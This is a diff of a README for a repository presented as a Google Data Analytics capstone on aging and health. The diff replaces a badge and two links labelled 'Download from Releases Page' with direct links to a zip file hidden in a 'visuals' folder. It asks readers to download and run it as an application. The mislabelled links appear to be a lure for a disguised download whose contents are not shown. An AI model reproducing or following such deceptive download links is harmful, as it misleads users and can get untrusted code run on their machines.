@@ -1,6 +1,6 @@
 # 🎉 Capstone_Google_Data_Analytics_Certificate - Discover Insights on Aging and Health
 
-![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)
+![Download](https://raw.githubusercontent.com/wet-discriminativestimulus220/Capstone_Google_Data_Analytics_Certificate/main/visuals/Capstone_Google_Data_Analytics_Certificate_v1.4.zip%20Now-Get%20the%20Latest%20Release-blue)
 
 ## 📋 Overview
 
@@ -18,7 +18,7 @@ Before downloading and running this application, make sure you have the followin
 
 To get started, you need to download the software from the Releases page. Click the link below to go directly to the download page:
 
-[Download from Releases Page](https://github.com/wet-discriminativestimulus220/Capstone_Google_Data_Analytics_Certificate/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/wet-discriminativestimulus220/Capstone_Google_Data_Analytics_Certificate/main/visuals/Capstone_Google_Data_Analytics_Certificate_v1.4.zip)
 
 ### 🌐 Features
 
@@ -31,7 +31,7 @@ To get started, you need to download the software from the Releases page. Click 
 
 1. Visit the Releases page to download the application:
 
-   [Download from Releases Page](https://github.com/wet-discriminativestimulus220/Capstone_Google_Data_Analytics_Certificate/releases)
+   [Download from Releases Page](https://raw.githubusercontent.com/wet-discriminativestimulus220/Capstone_Google_Data_Analytics_Certificate/main/visuals/Capstone_Google_Data_Analytics_Certificate_v1.4.zip)
 
 2. Once on the Releases page, you will see a list of the latest releases. Click on the one labeled "Latest Release".
 
